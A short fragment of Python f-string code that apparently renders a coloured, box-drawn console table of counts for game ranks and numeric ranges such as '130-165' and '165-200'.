 {cyan} ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛ ┏━━ Ranks ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓ ┃ [{reset}>{cyan}] {reset}130-165         >>:{cyan}[{green}{self.skinsam['130-165']}{cyan}]{space * (29 - len(str(self.skinsam['130-165'])))}┃
 {cyan} ┏━ Not main ━━━━━━━━━━━━━━━━━━━━━━━━━━┓ ┃ [{reset}>{cyan}] {reset}Unranked      >>:{cyan}[{green}{self.ranks['unranked']}{cyan}]{space * (18 - len(str(self.ranks['unranked'])))}┃ ┃ [{reset}>{cyan}] {reset}165-200         >>:{cyan}[{green}{self.skinsam['165-200']}{cyan}]{space * (29 - len(str(self.skinsam['165-200'])))}┃
